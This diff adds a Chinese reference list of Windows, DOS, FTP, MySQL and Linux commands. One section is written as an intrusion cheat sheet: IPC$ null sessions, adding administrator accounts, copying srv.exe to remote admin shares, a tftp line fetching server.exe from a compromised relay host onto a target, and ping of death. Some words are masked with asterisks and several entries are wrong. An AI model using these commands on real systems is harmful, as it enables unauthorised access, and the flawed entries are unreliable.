@@ -1,0 +1,1634 @@
+cmd
+-------------------------------------------------
+winver 检查Windows版本 
+wmimgmt.msc 打开Windows管理体系结构(wmi) 
+wupdmgr Windows更新程序 
+w脚本 Windows脚本宿主设置 
+write 写字板 
+winmsd 系统信息 
+wiaacmgr 扫描仪和照相机向导 
+winchat xp自带局域网聊天 
+mem.exe 显示内存使用情况 
+msconfig.exe 系统配置实用程序 
+mplayer2 简易widnows media player 
+mspaint 画图板 
+mstsc 远程桌面连接 
+mplayer2 媒体播放机 
+magnify 放大镜实用程序 
+mmc 打开控制台 
+mobsync 同步命令 
+dxdiag 检查directx信息 
+drwtsn32 系统医生 
+devmgmt.msc 设备管理器 
+dfrg.msc 磁盘碎片整理程序 
+diskmgmt.msc 磁盘管理实用程序 
+dcomcnfg 打开系统组件服务 
+ddeshare 打开dde共享设置 
+dvdplay dvd播放器 
+net stop messenger 停止信使服务 
+net start messenger 开始信使服务 
+notepad 打开记事本 
+nslookup 网络管理的工具向导 
+ntbackup 系统备份和还原 
+narrator 屏幕“讲述人” 
+ntmsmgr.msc 移动存储管理器 
+ntmsoprq.msc 移动存储管理员操作请求 
+netstat -an （tc）命令检查接口 
+syncapp 创建一个公文包 
+sysedit 系统配置编辑器 
+sigverif 文件签名验证程序 
+sndrec32 录音机 
+shrpubw 创建共享文件夹 
+secpol.msc 本地安全策略 
+syskey 系统加密，一旦加密就不能解开，保护Windows xp系统的双重密码 
+services.msc 本地服务设置 
+sndvol32 音量控制程序 
+sfc.exe 系统文件检查器 
+sfc /scannow windows文件保护 
+tsshutdn 60秒倒计时关机命令 
+tourstart xp简介（安装完成后出现的漫游xp程序） 
+taskmgr 任务管理器 
+eventvwr 事件查看器 
+eudcedit 造字程序 
+explorer 打开资源管理器 
+packager 对象包装程序 
+perfmon.msc 计算机性能监测程序 
+progman 程序管理器 
+regedit.exe 注册表 
+rsop.msc 组策略结果集 
+regedt32 注册表编辑器 
+rononce -p 15秒关机 
+regsvr32 /u *.dll 停止dll文件运行 
+regsvr32 /u zipfldr.dll 取消zip支持 
+cmd.exe cmd命令提示符 
+chkdsk.exe chkdsk磁盘检查 
+certmgr.msc 证书管理实用程序 
+calc 启动计算器 
+charmap 启动字符映射表 
+cliconfg sql server 客户端网络实用程序 
+clipbrd 剪贴板查看器 
+conf 启动netmeeting 
+compmgmt.msc 计算机管理 
+cleanmgr 垃圾整理 
+ciadv.msc 索引服务程序 
+osk 打开屏幕键盘 
+odbcad32 odbc数据源管理器 
+oobe/msoobe /a 检查xp是否激活 
+lusrmgr.msc 本机用户和组 
+logoff 注销命令 
+iexpress 木马捆绑工具，系统自带 
+nslookup ip地址侦测器 
+fsmgmt.msc 共享文件夹管理器 
+utilman 辅助工具管理器 
+gpedit.msc 组策略
+----------------------------
+
+
+
+DOS命令讲解 
+常用的命令 
+
+cd 改变当前目录 
+cls 清屏 
+copy 拷贝文件 
+del 删除文件 
+deltree 删除目录树 
+dir 列文件名 
+diskcopy 复制磁盘 
+edit 文本编辑 
+format 格式化磁盘 
+md 建立子目录 
+mem 查看内存状况 
+more 分屏显示 
+move 移动文件、改目录名 
+rd 删除目录 
+ren 改变文件名 
+type 显示文件内容 
+sys 制作DOS系统盘 
+xcopy 拷贝目录与文件 
+attrib 设置文件属性 
+chkdsk 检查磁盘 
+date 显示及修改日期 
+defrag 磁盘碎片整理 
+doskey 重新调用DOS命令 
+emm386 扩展内存管理 
+fdisk 硬盘分区 
+help 帮助 
+label 设置卷标号 
+lh 将程序装入高端内存 
+memmaker内存优化管理 
+msd 系统检测 
+path 设置搜寻目录 
+prempt 设置提示符 
+restore 恢复备份文件 
+time 显示及修改时间 
+scandisk检测、修理磁盘 
+set 设置环境变量 
+smartdrv设置磁盘加速器 
+undelete恢复被删的文件 
+
+不常用 
+
+append 设置非执行文件路径 
+debug 随机调试程序 
+diskcomp磁盘比较 
+expand 还原DOS文件 
+fasthelp快速显示帮助信息 
+fc 文件比较 
+interink启动服务器 
+intersvr启动客户机 
+qbasic Basic集成环境 
+setver 设置版本 
+share 文件共享 
+subst 路径替换 
+tree 列目录树 
+unformat恢复已格式化的磁盘 
+vsafe 防病毒 
+ver 显示DOS版本号 
+vol 显示磁盘卷标号 
+ctty 改变控制设备 
+
+DOS常用命令详解 
+dir 列文件名 deltree 删除目录树 cls 清屏 cd 改变当前目录 
+copy 拷贝文件 diskcopy 复制磁盘 del 删除文件 format 格式化磁盘 
+edit 文本编辑 mem 查看内存状况 md 建立子目录 move 移动文件、改目录名 
+more 分屏显示 type 显示文件内容 rd 删除目录 
+sys 制作DOS系统盘 
+ren 改变文件名 xcopy 拷贝目录与文件 chkdsk 检查磁盘 attrib 设置文件属性 
+fdisk 硬盘分区 date 显示及修改日期 label 设置卷标号 defrag 磁盘碎片整理 
+msd 系统检测 path 设置搜寻目录 share 文件共享 memmaker内存优化管理 
+help 帮助 restore 恢复备份文件 set 设置环境变量 time 显示及修改时间 
+tree 列目录树 debug 随机调试程序 doskey 重新调用DOS命令 prempt 设置提示符 undelete恢复被删的文件 scandisk检测、修理磁盘 
+
+不常用DOS命令 
+diskcomp磁盘比较 append 设置非执行文件路径 
+expand 还原DOS文件 fasthelp快速显示帮助信息 
+fc 文件比较 interink启动服务器 
+setver 设置版本 intersvr启动客户机 
+subst 路径替换 qbasic Basic集成环境 
+vsafe 防病毒 unformat恢复已格式化的磁盘 
+ver 显示DOS版本号 smartdrv设置磁盘加速器 
+vol 显示磁盘卷标号 lh 将程序装入高端内存 
+ctty 改变控制设备 emm386 扩展内存管理 
+常用命令具体介绍: 
+一、Dir 
+显示目录文件和子目录列表，呵呵，这个当然是人人要知道的。 
+可以使用通配符（? 和 *），？表通配一个字符，*表通配任意字符 
+*.后缀 
+指定要查看后缀的文件。 上面其实也可以为“ . 后缀”,例如dir *.exe 等于dir .exe 
+/p 
+每次显示一个列表屏幕。要查看下一屏，请按键盘上的任意键。 
+/w 
+以宽格式显示列表，在每一行上最多显示 5 个文件名或目录名。 
+/s 
+列出指定目录及所有子目录中出现的每个指定的文件名。比win环境下的查找快多了 
+dir *.* -> a.txt 把当前目录文件列表写入a.txt 
+dir *.* /s -> a.txt 把当前目录文件列表写入a.txt，包括子目录下文件。 
+二、Attrib 
+显示、设置或删除指派给文件或目录的只读、存档、系统以及隐藏属性。如果在不含参数的情况下使用，则 attrib 会显示当前目录中所有文件的属性。 
++r 
+设置只读属性。 
+-r 
+清除只读属性。 
++a 
+设置存档文件属性。 
+-a 
+清除存档文件属性。 
++s 
+设置系统属性。 
+-s 
+清除系统属性。 
++h 
+设置隐藏属性。 
+-h 
+清除隐藏属性。 
+三、Cl* 
+清除显示在命令提示符窗口中的所有信息，并返回空窗口，即“清屏” 
+四、**it 
+退出当前命令解释程序并返回到系统。 
+五、format 
+格式化 
+/q 
+执行快速格式化。删除以前已格式化卷的文件表和根目录，但不在扇区之间扫描损坏区域。使用 /q 命令行选项应该仅格式化以前已格式化的完好的卷。 
+六、Ipconfig 
+显示所有当前的 TCP/IP 网络配置值、刷新动态主机配置协议 (DHCP) 和域名系统 (DNS) 设置。使用不带参数的 ipconfig 可以显示所有适配器的 IP 地址、子网掩码、默认网关。 
+/all 
+显示所有适配器的完整 TCP/IP 配置信息。 
+ipconfig 等价于 winipcfg，后者在ME、98 和 95 上可用。尽管 Windows XP 没有提供象 winipcfg 命令一样的图形化界面，但可以使用“网络连接”查看和更新 IP 地址。要做到这一点，请打开 网络连接，右键单击某一网络连接，单击“状态”，然后单击“支持”选项卡。 
+该命令最适用于配置为自动获取 IP 地址的计算机。它使用户可以确定哪些 TCP/IP 配置值是由 DHCP、自动专用 IP 地址 (APIPA) 和其他配置配置的。 
+七、md 
+创建目录或子目录 
+八、Move 
+将一个或多个文件从一个目录移动到指定的目录。 
+九、Nbtstat 
+显示本地计算机和远程计算机的基于 TCP/IP (NetBT) 协议的 NetBIOS 统计资料、NetBIOS 名称表和 NetBIOS 名称缓存。Nbtstat 可以刷新 NetBIOS 名称缓存和注册的 Windows Internet 名称服务 (WINS) 名称。使用不带参数的 nbtstat 显示帮助。Nbtstat 命令行参数区分大小写。 
+-a remotename 
+显示远程计算机的 NetBIOS 名称表，其中，RemoteName 是远程计算机的 NetBIOS 计算机名称。 
+-A IPAddress 
+显示远程计算机的 NetBIOS 名称表，其名称由远程计算机的 IP 地址指定（以小数点分隔）。 
+十、Netstat 
+显示活动的 TCP 连接、计算机侦听的端口、以太网统计信息、IP 路由表、IPv4 统计信息（对于 IP、ICMP、TCP 和 UDP 协议）以及 IPv6 统计信息（对于 IPv6、ICMPv6、通过 IPv6 的 TCP 以及通过 IPv6 的 UDP 协议）。使用时如果不带参数，netstat 显示活动的 TCP 连接。 
+-a 
+显示所有活动的 TCP 连接以及计算机侦听的 TCP 和 U** 端口。 
+十一、*ing 
+通过发送“网际消息控制协议 (ICMP)”回响请求消息来验证与另一台 TCP/IP 计算机的 IP 级连接。回响应答消息的接收情况将和往返过程的次数一起显示出来。Ping 是用于检测网络连接性、可到达性和名称解析的疑难问题的主要 TCP/IP 命令。如果不带参数，ping 将显示帮助。名称和Ip地址解析是它的最简单应用也是用的最多的。 
+-t 
+指定在中断前 ping 可以持续发送回响请求信息到目的地。要中断并显示统计信息，请按 CTRL-BREAK。要中断并退出 ping，请按 CTRL-C。 
+-lSize 
+指定发送的回响请求消息中“数据”字段的长度（以字节表示）。默认值为 32。size 的最大值是 65,527。 
+十二、Rename (Ren) 
+更改文件的名称。 
+例如 ren *.abc *.cba 
+十三、Set 
+显示、设置或删除环境变量。如果没有任何参数，set 命令将显示当前环境设置。 
+十四、Shutdown 
+允许您关闭或重新启动本地或远程计算机。如果没有使用参数，shutdown 将注销当前用户。 
+-m ComputerName 
+指定要关闭的计算机。 
+-t xx 
+将用于系统关闭的定时器设置为 xx 秒。默认值是 20 秒。 
+-l 
+注销当前用户，这是默认设置。-m ComputerName 优先。 
+-s 
+关闭本地计算机。 
+-r 
+关闭之后重新启动。 
+-a 
+中止关闭。除了 -l 和 ComputerName 外，系统将忽略其它参数。在超时期间，您只可以使用 -a。 
+十五、System File Checker (sfc) 
+win下才有，在重新启动计算机后扫描和验证所有受保护的系统文件。 
+/scannow 
+立即扫描所有受保护的系统文件。 
+/scanonce 
+一次扫描所有受保护的系统文件。 
+/purgecache 
+立即清除“Windows 文件保护”文件高速缓存，并扫描所有受保护的系统文件。 
+/cachesize=x 
+设置“Windows 文件保护”文件高速缓存的大小，以 MB 为单位。 
+十六、type 
+显示文本文件的内容。使用 type 命令查看文本文件或者是bat文件而不修改文件 
+十七、Tree 
+图像化显示路径或驱动器中磁盘的目录结构。 
+十八、Xcopy 
+复制文件和目录，包括子目录。 
+/s 
+复制非空的目录和子目录。如果省略 /s，xcopy 将在一个目录中工作。 
+/e 
+复制所有子目录，包括空目录。 
+十九、copy 
+将一个或多个文件从一个位置复制到其他位置 
+二十、del 
+删除指定文件。 
+ftp和bat批命令和net和telnet由于子命令太多，这里不说了，不过这几个都是常用到的。 
+
+
+CMD命令大全（已更新） 
+
+
+net use [url=file://ip/ipc$]\\ip\ipc$[/url] " " /user:" " 建立IPC空链接 
+net use [url=file://ip/ipc$]\\ip\ipc$[/url] "密码" /user:"用户名" 建立IPC非空链接 
+net use h: [url=file://ip/c$]\\ip\c$[/url] "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: 
+net use h: [url=file://ip/c$]\\ip\c$[/url] 登陆后映射对方C：到本地为H: 
+net use [url=file://ip/ipc$]\\ip\ipc$[/url] /del 删除IPC链接 
+net use h: /del 删除映射对方到本地的为H:的映射 
+net user 用户名 密码 /add 建立用户 
+net user guest /active:yes 激活guest用户 
+net user 查看有哪些用户 
+net user 帐户名 查看帐户的属性 
+net localgroup ***istrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：***istrator后加s用复数 
+net start 查看开启了哪些服务 
+net start 服务名 开启服务；(如:net start telnet， net start schedule) 
+net stop 服务名 停止某服务 
+net time \\目标ip 查看对方时间 
+net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 
+net view 查看本地局域网内开启了哪些共享 
+net view [url=file://ip/]\\ip[/url] 查看对方局域网内开启了哪些共享 
+net config 显示系统网络设置 
+net logoff 断开连接的共享 
+net pause 服务名 暂停某服务 
+net send ip "文本信息" 向对方发信息 
+net ver 局域网内正在使用的网络连接类型和信息 
+net share 查看本地开启的共享 
+net share ipc$ 开启ipc$共享 
+net share ipc$ /del 删除ipc$共享 
+net share c$ /del 删除C：共享 
+net user guest 12345 用guest用户登陆后用将密码改为12345 
+net password 密码 更改系统登陆密码 
+netstat -a 查看开启了哪些端口,常用netstat -an 
+netstat -n 查看端口的网络连接情况，常用netstat -an 
+netstat -v 查看正在进行的工作 
+netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） 
+netstat -s 查看正在使用的所有协议使用情况 
+nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 
+tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 
+ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 
+ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) 
+ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 
+tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
+kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
+del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件 
+del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） 
+move 盘符\路径\要移动的文件名 存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 
+fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令 
+at id号 开启已注册的某个计划任务 
+at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 
+at id号 /delete 停止某个已注册的计划任务 
+at 查看所有的计划任务 
+at [url=file://ip/]\\ip[/url] time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 
+finger username @host 查看最近有哪些用户登陆 
+telnet ip 端口 远和登陆服务器,默认端口为23 
+open ip 连接到IP（属telnet登陆后的命令） 
+telnet 在本机上直接键入telnet 将进入本机的telnet 
+copy 路径\文件名1 路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 
+copy c:\srv.exe [url=file://ip/***$]\\ip\***$[/url] 复制本地c:\srv.exe到对方的***下 
+cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 
+copy [url=file://ip/***$/svv.exe]\\ip\***$\svv.exe[/url] c:\ 或:copy\\ip\***$\*.* 复制对方***i$共享下的srv.exe文件（所有文件）至本地C： 
+xcopy 要复制的文件或目录树 目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 
+tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 
+tftp -i 对方IP put c:\server.exe 登陆后，上传本地c:\server.exe至主机 
+ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) 
+route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface 
+arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 
+start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 
+mem 查看cpu使用情况 
+attrib 文件名(目录名) 查看某文件（目录）的属性 
+attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 
+dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 
+date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 
+set 指定环境变量名称=要指派给变量的字符 设置环境变量 
+set 显示当前所有的环境变量 
+set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 
+pause 暂停批处理程序，并显示出：请按任意键继续.... 
+if 在批处理程序中执行条件处理（更多说明见if命令及变量） 
+goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签） 
+call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） 
+for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） 
+echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 
+echo 信息 在屏幕上显示出信息 
+echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中 
+findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello 
+find 文件名 查找某文件 
+title 标题名字 更改CMD窗口标题名字 
+color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 
+prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ ) 
+ver 在DOS窗口下显示版本信息 
+winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） 
+format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS 
+md 目录名 创建目录 
+replace 源文件 要替换文件的目录 替换文件 
+ren 原文件名 新文件名 重命名文件名 
+tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 
+type 文件名 显示文本文件的内容 
+more 文件名 逐屏显示输出文件 
+doskey 要锁定的命令＝字符 
+doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= 
+taskmgr 调出任务管理器 
+chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 
+tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 
+exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe 
+path 路径\可执行文件的文件名 为可执行文件设置一个路径。 
+cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? 
+regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； 
+regedit /e 注册表文件名 导出注册表 
+cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名erm 替换指定用户的访问权限；/G 用户名erm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。 
+cacls 文件名 查看文件的访问用户权限列表 
+REM 文本内容 在批处理文件中添加注解 
+netsh 查看或更改本地网络配置情况 
+IIS服务命令： 
+iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） 
+iisreset /start或stop 启动（停止）所有Internet服务 
+iisreset /restart 停止然后重新启动所有Internet服务 
+iisreset /status 显示所有Internet服务状态 
+iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 
+iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 
+iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 
+iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 
+
+FTP 命令： (后面有详细说明内容) 
+ftp的命令行格式为: 
+ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 
+－d 使用调试方式。 
+－n 限制ftp的自动登录,即不使用.netrc文件。 
+－g 取消全局文件名。 
+help [命令] 或 ？[命令] 查看命令说明 
+bye 或 quit 终止主机FTP进程,并退出FTP管理方式. 
+pwd 列出当前远端主机目录 
+put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 
+get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 
+mget [remote-files] 从远端主机接收一批文件至本地主机 
+mput local-files 将本地主机中一批文件传送至远端主机 
+dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 
+ascii 设定以ASCII方式传送文件(缺省值) 
+bin 或 image 设定以二进制方式传送文件 
+bell 每完成一次文件传送,报警提示 
+cdup 返回上一级目录 
+close 中断与远程服务器的ftp会话(与open对应) 
+open host[port] 建立指定ftp服务器连接,可指定连接端口 
+delete 删除远端主机中的文件 
+mdelete [remote-files] 删除一批文件 
+mkdir directory-name 在远端主机中建立目录 
+rename [from] [to] 改变远端主机中的文件名 
+rmdir directory-name 删除远端主机中的目录 
+status 显示当前FTP的状态 
+system 显示远端主机系统类型 
+user user-name [password] [account] 重新以别的用户名登录远端主机 
+open host [port] 重新建立一个新的连接 
+prompt 交互提示模式 
+macdef 定义宏命令 
+lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 
+chmod 改变远端主机的文件权限 
+case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 
+cd remote－dir 进入远程主机目录 
+cdup 进入远程主机目录的父目录 
+! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip 
+
+MYSQL 命令： 
+mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。 
+（例：mysql -h110.110.110.110 -Uroot -P123456 
+注:u与root可以不用加空格，其它也一样） 
+exit 退出MYSQL 
+mysql*** -u用户名 -p旧密码 password 新密码 修改密码 
+grant select on 数据库.* to 用户名@登录主机 identified by \"密码\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） 
+show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。 
+
+use mysql； 
+show tables; 显示库中的数据表 
+describe 表名; 显示数据表的结构 
+create database 库名; 建库 
+use 库名； 
+create table 表名 (字段设定列表)； 建表 
+drop database 库名; 
+drop table 表名； 删库和删表 
+delete from 表名; 将表中记录清空 
+select * from 表名; 显示表中的记录 
+mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的[url=file://mysql//bin]\\mysql\\bin[/url]目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 
+win2003系统下新增命令（实用部份）： 
+shutdown /参数 关闭或重启本地或远程主机。 
+参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 
+例：shutdown /r /t 0 立即重启本地主机（无延时） 
+taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 
+参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 
+tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 
+参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 
+Linux系统下基本命令： 要区分大小写 
+uname 显示版本信息（同win2K的 ver） 
+dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） 
+pwd 查询当前所在的目录位置 
+cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。 
+cat 文件名 查看文件内容 
+cat >abc.txt 往abc.txt文件中写上内容。 
+more 文件名 以一页一页的方式显示一个文本文件。 
+cp 复制文件 
+mv 移动文件 
+rm 文件名 删除文件，rm -a 目录名删除目录及子目录 
+mkdir 目录名 建立目录 
+rmdir 删除子目录，目录内没有文档。 
+chmod 设定档案或目录的存取权限 
+grep 在档案中查找字符串 
+diff 档案文件比较 
+find 档案搜寻 
+date 现在的日期、时间 
+who 查询目前和你使用同一台机器的人以及Login时间地点 
+w 查询目前上机者的详细资料 
+whoami 查看自己的帐号名称 
+groups 查看某人的Group 
+passwd 更改密码 
+history 查看自己下过的命令 
+ps 显示进程状态 
+kill 停止某进程 
+gcc 黑客通常用它来编译C语言写的文件 
+su 权限转换为指定使用者 
+telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 
+ftp ftp连接上某服务器（同win2K） 
+附：批处理命令与变量 
+1：for命令及变量 基本格式： 
+FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %
+XP.CMD命令大全
+
+有关某个命令的详细信息，请键入 HELP 命令名
+ASSOC 显示或修改文件扩展名关联。
+AT 计划在计算机上运行的命令和程序。
+ATTRIB 显示或更改文件属性。
+BREAK 设置或清除扩展式 CTRL+C 检查。
+CACLS 显示或修改文件的访问控制列表(ACLs)。
+CALL 从另一个批处理程序调用这一个。
+CD 显示当前目录的名称或将其更改。
+CHCP 显示或设置活动代码页数。
+CHDIR 显示当前目录的名称或将其更改。
+CHKDSK 检查磁盘并显示状态报告。
+CHKNTFS 显示或修改启动时间磁盘检查。
+CLS 清除屏幕。
+CMD 打开另一个 Windows 命令解释程序窗口。
+COLOR 设置默认控制台前景和背景颜色。
+COMP 比较两个或两套文件的内容。
+COMPACT 显示或更改 NTFS 分区上文件的压缩。
+CONVERT 将 FAT 卷转换成 NTFS。您不能转换
+当前驱动器。
+COPY 将至少一个文件复制到另一个位置。
+DATE 显示或设置日期。
+DEL 删除至少一个文件。
+DIR 显示一个目录中的文件和子目录。
+DISKCOMP 比较两个软盘的内容。
+DISKCOPY 将一个软盘的内容复制到另一个软盘。
+DOSKEY 编辑命令行、调用 Windows 命令并创建宏。
+ECHO 显示消息，或将命令回显打开或关上。
+ENDLOCAL 结束批文件中环境更改的本地化。
+ERASE 删除至少一个文件。
+EXIT 退出 CMD.EXE 程序(命令解释程序)。
+FC 比较两个或两套文件，并显示
+不同处。
+FIND 在文件中搜索文字字符串。
+FINDSTR 在文件中搜索字符串。
+FOR 为一套文件中的每个文件运行一个指定的命令。
+FORMAT 格式化磁盘，以便跟 Windows 使用。
+FTYPE 显示或修改用于文件扩展名关联的文件类型。
+GOTO 将 Windows 命令解释程序指向批处理程序
+中某个标明的行。
+GRAFTABL 启用 Windows 来以图像模式显示
+扩展字符集。
+HELP 提供 Windows 命令的帮助信息。
+IF 执行批处理程序中的条件性处理。
+LABEL 创建、更改或删除磁盘的卷标。
+MD 创建目录。
+MKDIR 创建目录。
+MODE 配置系统设备。
+MORE 一次显示一个结果屏幕。
+MOVE 将文件从一个目录移到另一个目录。
+PATH 显示或设置可执行文件的搜索路径。
+PAUSE 暂停批文件的处理并显示消息。
+POPD 还原 PUSHD 保存的当前目录的上一个值。
+PRINT 打印文本文件。
+PROMPT 更改 Windows 命令提示符。
+PUSHD 保存当前目录，然后对其进行更改。
+RD 删除目录。
+RECOVER 从有问题的磁盘恢复可读信息。
+REM 记录批文件或 CONFIG.SYS 中的注释。
+REN 重命名文件。
+RENAME 重命名文件。
+REPLACE 替换文件。
+RMDIR 删除目录。
+SET 显示、设置或删除 Windows 环境变量。
+SETLOCAL 开始批文件中环境更改的本地化。
+SHIFT 更换批文件中可替换参数的位置。
+SORT 对输入进行分类。
+START 启动另一个窗口来运行指定的程序或命令。
+SUBST 将路径跟一个驱动器号关联。
+TIME 显示或设置系统时间。
+TITLE 设置 CMD.EXE 会话的窗口标题。
+TREE 以图形模式显示驱动器或路径的目录结构。
+TYPE 显示文本文件的内容。
+VER 显示 Windows 版本。
+VERIFY 告诉 Windows 是否验证文件是否已正确
+写入磁盘。
+VOL 显示磁盘卷标和序列号。
+XCOPY 复制文件和目录树。
+
+
+appwiz.cpl------------添加删除程序
+control userpasswords2--------用户帐户设置
+cleanmgr-------垃圾整理
+CMD--------------命令提示符可以当作是 Windows 的一个附件，Ping，Convert 这些不能在图形环境下 使用的功能要借助它来完成。
+
+cmd------jview察看Java虚拟机版本。
+
+command.com------调用的则是系统内置的 NTVDM，一个 DOS虚拟机。它完全是一个类似 Virtual PC 的 虚拟环境，和系统本身联系不大。当我们在命令提示符下运行 DOS 程序时，实际上也 是自动转移到 NTVDM虚拟机下，和 CMD 本身没什么关系。
+
+calc-----------启动计算器
+chkdsk.exe-----Chkdsk磁盘检查
+compmgmt.msc---计算机管理
+conf-----------启动 netmeeting
